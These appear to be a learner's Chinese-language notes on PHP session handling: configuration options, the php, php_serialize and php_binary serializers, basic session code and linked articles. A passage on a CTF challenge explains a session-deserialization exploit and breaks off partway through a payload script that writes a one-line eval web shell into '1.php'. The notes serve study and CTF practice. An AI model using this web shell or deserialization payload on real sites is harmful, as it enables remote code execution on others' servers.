<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. session.save_path=&quot;&quot;  --&#x8BBE;&#x7F6E;session&#x7684;&#x5B58;&#x50A8;&#x8DEF;&#x5F84;</span><br><span class="line">2. session.save_handler=&quot;&quot; --&#x8BBE;&#x5B9A;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x5B58;&#x50A8;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x4F7F;&#x7528;PHP&#x5185;&#x7F6E;&#x4F1A;&#x8BDD;&#x5B58;&#x50A8;&#x673A;&#x5236;&#x4E4B;&#x5916;&#x7684;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x672C;&#x51FD;&#x6570;(&#x6570;&#x636E;&#x5E93;&#x7B49;&#x65B9;&#x5F0F;)</span><br><span class="line">3. session.auto_start  boolen --&#x6307;&#x5B9A;&#x4F1A;&#x8BDD;&#x6A21;&#x5757;&#x662F;&#x5426;&#x5728;&#x8BF7;&#x6C42;&#x5F00;&#x59CB;&#x65F6;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;,&#x9ED8;&#x8BA4;&#x4E3A;0&#x4E0D;&#x542F;&#x52A8;</span><br><span class="line">4. session.serialize_handler  string --&#x5B9A;&#x4E49;&#x7528;&#x6765;&#x5E8F;&#x5217;&#x5316;/&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5904;&#x7406;&#x5668;&#x540D;&#x5B57;&#x3002;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#e.g.</span><br><span class="line">session.save_path=&quot;D:\xampp\tmp&quot;  &#x8868;&#x660E;&#x6240;&#x6709;&#x7684;session&#x6587;&#x4EF6;&#x90FD;&#x662F;&#x5B58;&#x50A8;&#x5728;xampp/tmp&#x4E0B;</span><br><span class="line">session.save_handler=files     &#x8868;&#x660E;session&#x662F;&#x4EE5;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x7684;</span><br><span class="line">session.auto_start=0        &#x8868;&#x660E;&#x9ED8;&#x8BA4;&#x4E0D;&#x542F;&#x52A8;session</span><br><span class="line">session.serialize_handler=php    &#x8868;&#x660E;session&#x7684;&#x9ED8;&#x8BA4;&#x5E8F;&#x5217;&#x8BDD;&#x5F15;&#x64CE;&#x4F7F;&#x7528;&#x7684;&#x662F;php&#x5E8F;&#x5217;&#x8BDD;&#x5F15;&#x64CE;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>session &#x5B58;&#x50A8;&#x7C7B;&#x578B;&#xFF1A;<ul>
<li>file - &#x5C06; Session &#x4FDD;&#x5B58;&#x5728; &#x6587;&#x4EF6; &#x4E2D;&#x3002;</li>
<li>cookie - Session &#x4FDD;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x52A0;&#x5BC6;&#x7684; Cookie &#x4E2D;&#x3002;</li>
<li>database - Session &#x4FDD;&#x5B58;&#x5728;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;</li>
<li>memcached / redis - Sessions &#x4FDD;&#x5B58;&#x5728;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x5FEB;&#x901F;&#x4E14;&#x57FA;&#x4E8E;&#x7F13;&#x5B58;&#x7684;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x4E2D;&#x3002;</li>
<li>array - Sessions &#x4FDD;&#x5B58;&#x5728; PHP &#x6570;&#x7EC4;&#x4E2D;&#xFF0C;&#x4E0D;&#x4F1A;&#x88AB;&#x6301;&#x4E45;&#x5316;&#x3002;</li>
</ul>
</li>
<li>session&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#xFF1A;<ul>
<li>php_binary:&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x952E;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x5BF9;&#x5E94;&#x7684;ASCII&#x5B57;&#x7B26;+&#x952E;&#x540D;+&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x7684;&#x503C;</li>
<li>php:&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x952E;&#x540D;+&#x7AD6;&#x7EBF;+&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x7684;&#x503C;</li>
<li>php_serialize(php&gt;5.5.4):&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x7684;&#x503C;</li>
</ul>
</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&quot;hh&quot;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;pwd&quot;</span>] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">hh</span><br><span class="line"><span class="number">123</span>    </span><br></pre></td></tr></table></div></figure>

<ul>
<li>session&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#xFF1A;/tmp/            &#x8FD9;&#x4E2A;&#x4E00;&#x822C;&#x662F;&#x9ED8;&#x8BA4;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;session_save_path&#x6765;&#x67E5;&#x770B;</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x5F00;&#x542F;session&#x4F1A;&#x8BDD;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x8BBE;&#x7F6E;session</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&apos;username&apos;</span>] = <span class="string">&apos;adminuser&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x83B7;&#x53D6;session</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x5220;&#x9664;session</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&apos;username&apos;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6E05;&#x7A7A;session</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6216;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x9500;&#x6BC1;session</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br></pre></td></tr></table></div></figure>





<blockquote>
<p>&#x8FD8;&#x6709;&#x4E0D;&#x61C2;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5173;&#x4E8E;SID&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x5173;&#x4E8E;&#x91CD;&#x5199;URL&#xFF0C;&#x5173;&#x4E8E;session_start&#x51FD;&#x6570;&#x5185;&#x90E8;&#x65F6;&#x5982;&#x4F55;&#x8C03;&#x7528;&#x7684;</p>
</blockquote>
<hr>
<p>session&#x94FE;&#x63A5;&#xFF1A;&#xFF08;&#x4E00;&#x4E9B;&#x6587;&#x7AE0;&#x5927;&#x6982;&#x6D4F;&#x89C8;&#x5B8C;&#x4E86;&#xFF09;</p>
<ul>
<li><input checked disabled type="checkbox"> [<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request_id%22:%22160775411819724848183660%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&amp;request_id=160775411819724848183660&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&amp;utm_term=session&amp;spm=1018.2118.3001.4450">&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;]PHP&#x4E2D;session&#x7684;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;(WP)_Y4tacker&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_php session&#x5B58;&#x50A8;&#x65B9;&#x5F0F;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
</ul>
<p>Y4&#x5E08;&#x5085;&#x8BB2;&#x7684;&#x5F88;&#x591A;&#xFF0C;&#x5DEE;&#x4E0D;&#x591A;&#x6BD4;&#x8F83;&#x5168;&#xFF08;&#x4F60;&#x81EA;&#x5DF1;&#x518D;&#x5217;&#x4E2A;&#x76EE;&#x5F55;&#x6D88;&#x5316;&#x4E00;&#x4E0B;&#x7F62;&#xFF09;  </p>
<ul>
<li><input checked disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.jb51.net/article/116246.htm">&#x6DF1;&#x5165;&#x6D45;&#x6790;PHP&#x7684;session&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x95EE;&#x9898;_php&#x5B9E;&#x4F8B;_&#x811A;&#x672C;&#x4E4B;&#x5BB6; (jb51.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x8BB2;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x8FD8;&#x4E0D;&#x9519;&#xFF0C;&#x81EA;&#x5DF1;&#x7406;&#x89E3;&#x5C31;&#x662F;&#x4F1A;&#x62FC;&#x63A5;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x7136;&#x540E;&#x9020;&#x6210;&#x6F0F;&#x6D1E;</li>
<li><input checked disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/mike1314/p/6985457.html">PHP&#x4F1A;&#x8BDD;&#x673A;&#x5236;&#x2014;session&#x7684;&#x57FA;&#x672C;&#x4F7F;&#x7528; - &#x575A;&#x6301;&#x5954;&#x8DD1;&#x5728;&#x8DEF;&#x4E0A; - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x5199;&#x7684;session&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x8BB2;&#x4E86;session&#x7684;&#x521B;&#x5EFA;&#xFF0C;&#x4FEE;&#x6539;session&#x8C03;&#x7528;&#x4E86;&#x54EA;&#x4E9B;&#x51FD;&#x6570;&#xFF0C;&#x5728;&#x672C;&#x5730;&#x662F;&#x5982;&#x4F55;&#x4ECE;&#x64CD;&#x4F5C;&#x7684;&#xFF1B;&#x7981;&#x7528;cookie&#x65F6;&#x5982;&#x4F55;&#x4F7F;&#x7528;session(&#x91CD;&#x5199;url);&#x5C24;&#x5176;&#x8BB2;&#x4E86;&#x83B7;&#x53D6;session&#x7684;&#x65F6;&#x5019;&#x67E5;&#x8BE2;&#x4E0D;&#x540C;&#x4FE1;&#x606F;&#x8C03;&#x7528;&#x7684;&#x4E0D;&#x540C;&#x51FD;&#x6570;</li>
<li><input checked disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/acpp/archive/2011/06/10/2077592.html">&#x5F7B;&#x5E95;&#x7406;&#x89E3;PHP&#x7684;SESSION&#x673A;&#x5236; - &#x8BD7;&#x5C0F;&#x84DD; - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43234235/article/details/107524402">GC&#xFF08;&#x5783;&#x573E;&#x56DE;&#x6536;&#xFF09;&#x8BE6;&#x89E3;_&#x66E6;&#x66AE;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  &#x548C;session&#x8D85;&#x65F6;&#x6570;&#x636E;&#x88AB;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6709;&#x5173;&#xFF0C;&#x76EE;&#x524D;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FD8;&#x6CA1;&#x63A5;&#x89E6;&#x8FC7;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x53EA;&#x77E5;&#x9053;&#x65F6;&#x95F4;&#x6233;&#x9ED8;&#x8BA4;1440s&#x8FC7;&#x4E86;&#xFF0C;session&#x5C31;&#x88AB;&#x56DE;&#x6536;&#x4E86;&#xFF0C;&#x597D;&#x50CF;&#x8DDF;&#x5F00;&#x53D1;&#x6709;&#x70B9;&#x5173;&#x7CFB;</li>
<li><input checked disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113808539"> CTFshow-WEB&#x5165;&#x95E8;-&#x53CD;&#x5E8F;&#x5217;&#x5316;_bfengj&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_ctf web &#x53CD;&#x5E8F;&#x5217;&#x5316;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  feng&#x5E08;&#x5085;&#x8BB2;&#x7684;&#x597D;&#xFF01;&#x770B;&#x5B8C;&#x5C31;&#x7A0D;&#x5FAE;&#x61C2;&#x4E86;&#x4E00;&#x70B9;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-454911.html">php session &#x4F1A;&#x8BDD;&#xFF08;&#x4E13;&#x9898;&#xFF09;-php&#x6559;&#x7A0B;-PHP&#x4E2D;&#x6587;&#x7F51;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x8FD9;&#x7BC7;session&#x6559;&#x7A0B;&#x5F88;&#x5F88;&#x5F88;&#x5168;&#x9762;&#xFF01;&#xFF01;</li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/109300305?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166118662816780357223316%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166118662816780357223316&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-109300305-null-null.nonecase&amp;utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450">php Session&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;_lonmar~&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_session&#x6F0F;&#x6D1E;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>     &#x5927;&#x54E5;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x770B;&#x5B8C;&#x7136;&#x540E;&#x505A;&#x597D;&#x5427;&#xFF0C;&#x4E0D;&#x80FD;&#x56EB;&#x56F5;&#x541E;&#x67A3;</li>
</ul>
<hr>
<p>20220822 start</p>
<ul>
<li><p><strong>UUID</strong> &#x662F;&#x6307;Universally Unique Identifier&#xFF0C;&#x7FFB;&#x8BD1;&#x4E3A;&#x4E2D;&#x6587;&#x662F;<strong>&#x901A;&#x7528;&#x552F;&#x4E00;&#x8BC6;&#x522B;&#x7801;</strong>&#xFF0C;UUID &#x7684;&#x76EE;&#x7684;&#x662F;&#x8BA9;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5143;&#x7D20;&#x90FD;&#x80FD;&#x6709;&#x552F;&#x4E00;&#x7684;&#x8BC6;&#x522B;&#x4FE1;&#x606F;&#x3002;&#x5982;&#x6B64;&#x4E00;&#x6765;&#xFF0C;&#x6BCF;&#x4E2A;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E0D;&#x4E0E;&#x5176;&#x5B83;&#x4EBA;&#x51B2;&#x7A81;&#x7684; UUID&#xFF0C;&#x5C31;&#x4E0D;&#x9700;&#x8003;&#x8651;&#x6570;&#x636E;&#x5E93;&#x521B;&#x5EFA;&#x65F6;&#x7684;&#x540D;&#x79F0;&#x91CD;&#x590D;&#x95EE;&#x9898;&#x3002;UUID &#x662F;&#x7531;&#x4E00;&#x7EC4;32&#x4F4D;&#x6570;&#x7684;16&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x6240;&#x6784;&#x6210;&#xFF0C;&#x662F;&#x6545; UUID &#x7406;&#x8BBA;&#x4E0A;&#x7684;&#x603B;&#x6570;&#x4E3A;1632=2128&#xFF0C;&#x7EA6;&#x7B49;&#x4E8E;3.4 x 10123&#x3002;</p>
</li>
<li><p>inc&#x662F;&#x201C;include file&#x201D;&#x7684;&#x7F29;&#x5199; &#x53EF;&#x4EE5;include&#x4E00;&#x4E2A;&#x6837;&#x5F0F;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;include&#x4E00;&#x4E2A;&#x4EC0;&#x4E48;&#x8C03;&#x7528;&#x7684;&#x6587;&#x4EF6;</p>
</li>
</ul>
<p>20220823 start you got no timme</p>
<ul>
<li>&#x8FD9;&#x9053;&#x9898;&#x7684;payload&#x7684;&#x662F;&#x5229;&#x7528;PHPsession&#x751F;&#x6210;&#x5668;&#x548C;&#x89E3;&#x91CA;&#x5668;&#x7684;&#x65B9;&#x6CD5;&#x4E0D;&#x540C;&#x9020;&#x6210;&#x7684;&#xFF0C;</li>
</ul>
<p>&#x7531;&#x4E8E;&#x201C;php&#x201D;&#x8FD9;&#x4E2A;&#x65B9;&#x5F0F;&#x751F;&#x6210;&#x7684;session&#x662F;<code>user|&#x5E8F;&#x5217;&#x5316;&#x7684;&#x4E1C;&#x4E1C;</code>  &#xFF0C;&#x800C;&#x201C;php_serialize&#x201D; &#x8FD9;&#x4E2A;&#x65B9;&#x5F0F;&#x751F;&#x6210;&#x7684;&#x662F;<code>a:1:{&#x5E8F;&#x5217;&#x5316;&#x7684;&#x4E1C;&#x897F;&#x53EF;&#x80FD;&#x4F1A;&#x6D89;&#x53CA;|}</code>  &#x6240;&#x4EE5;&#x4E24;&#x8FB9;&#x7AD6;&#x7EBF;&#x7684;&#x4F4D;&#x7F6E;&#x4E0D;&#x4E00;&#x6837;&#x6240;&#x4EE5;&#x89E3;&#x91CA;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x6B67;&#x4E49;&#xFF0C;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x63D2;&#x5165;&#x81EA;&#x5DF1;&#x60F3;&#x8981;&#x6784;&#x9020;&#x7684;&#x4EE3;&#x7801;&#x4E86;</p>
<div class="table-container"><table>
<thead>
<tr>
<th>php_serialize</th>
<th>&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x7EC4;</th>
</tr>
</thead>
<tbody><tr>
<td><strong>php</strong></td>
<td><strong>&#x952E;&#x540D;+&#x7AD6;&#x7EBF;+&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5904;&#x7406;&#x7684;&#x503C;</strong></td>
</tr>
<tr>
<td><strong>php_binary</strong></td>
<td><strong>&#x952E;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x5BF9;&#x5E94;&#x7684;ascii&#x5B57;&#x7B26;+&#x952E;&#x540D;+serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x503C;</strong></td>
</tr>
</tbody></table></div>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&apos;session.save_path&apos;</span>,<span class="string">&apos;\tmp&apos;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&apos;session.serialize_handler&apos;</span>,<span class="string">&apos;php&apos;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&quot;hh&quot;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;pwd&quot;</span>] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#x4F7F;&#x7528;php&#x8FD9;&#x4E2A;&#x683C;&#x5F0F;&#x7684;session&#xFF0C;session&#x53D8;&#x91CF;&#x7684;&#x503C;&#x662F;&#xFF1A;</span><br><span class="line">user|s:<span class="number">4</span>:<span class="string">&quot;hhdd&quot;</span>;pwd|s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#x4F7F;&#x7528;php_serialize&#x8FD9;&#x4E2A;&#x683C;&#x5F0F;&#x7684;session&#xFF0C;session&#x53D8;&#x91CF;&#x7684;&#x503C;&#x662F;&#xFF1A;</span><br><span class="line">a:<span class="number">2</span>:{s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;hhdd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;pwd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;}</span><br></pre></td></tr></table></div></figure>

<hr>
<p>&#x5173;&#x4E8E;&#x8FD9;&#x9053;&#x9898;&#xFF1A;</p>
<p>&#x9664;&#x4E86;&#x5229;&#x7528;PHP&#x548C;php_serialize&#x8FD9;&#x4E24;&#x79CD;&#x89E3;&#x91CA;&#x5668;(&#x4F1A;&#x8BDD;&#x7A97;&#x53E3;&#xFF1F;)&#x4E0D;&#x540C;&#xFF1B;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5371;&#x9669;&#x51FD;&#x6570;&#xFF1A;<code>file_put_content</code>,&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x4E1C;&#x4E1C;&#x5C31;&#x53EF;&#x4EE5;&#x5F80;username&#x5199;&#x4E1C;&#x897F;&#xFF08;&#x56E0;&#x4E3A;username&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x5F62;&#x53C2;&#xFF09;&#xFF0C;&#x5199;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x53EF;&#x4EE5;&#x653E;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x5F62;&#x53C2;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable language_">$this</span>-&gt;username, <span class="string">&quot;&#x4F7F;&#x7528;&quot;</span>.<span class="variable language_">$this</span>-&gt;password.<span class="string">&quot;&#x767B;&#x9646;&quot;</span>.(<span class="variable language_">$this</span>-&gt;status?<span class="string">&quot;&#x6210;&#x529F;&quot;</span>:<span class="string">&quot;&#x5931;&#x8D25;&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&apos;Y-m-d H:i:s&apos;</span>));</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x7136;&#x540E;&#x6784;&#x9020;payload&#xFF08;&#x6CE8;&#x610F;&#x7F16;&#x7801;&#xFF0C;&#x9898;&#x76EE;&#x4E2D;&#x8BBE;&#x7F6E;&#x7684;cookie&#x662F;base64&#x7F16;&#x7801;&#xFF09;&#xFF0C;&#x4FEE;&#x6539;cookie&#x7684;&#x503C;&#xFF0C;&#x5229;&#x7528;&#x5199;&#x5165;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x5373;&#x53EF;</p>
<p>&#x81EA;&#x5DF1;&#x6784;&#x9020;payload&#x51FA;&#x4E0D;&#x6765;&#xFF0C;&#x800C;&#x7FA4;&#x4E3B;&#x7684;payload&#x5C31;&#x53EF;&#x4EE5;&#xFF0C;&#x96BE;&#x9053;&#x8981;&#x8BBE;&#x7F6E;session&#x5417;&#xFF1B;&#x8FD8;&#x662F;&#x8BF4;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x7F3A;&#x7701;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x5C31;&#x4F1A;&#x5931;&#x8D25;?&#x8981;&#x4E0D;&#x81EA;&#x5DF1;&#x8BD5;&#x8BD5;&#x770B;&#xFF1F;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x7FA4;&#x4E3B;&#x7684;&#xFF1A;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&apos;1.php&apos;</span>,<span class="string">&apos;&lt;?php eval($_POST[1]);phpinfo();?&gt;&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title 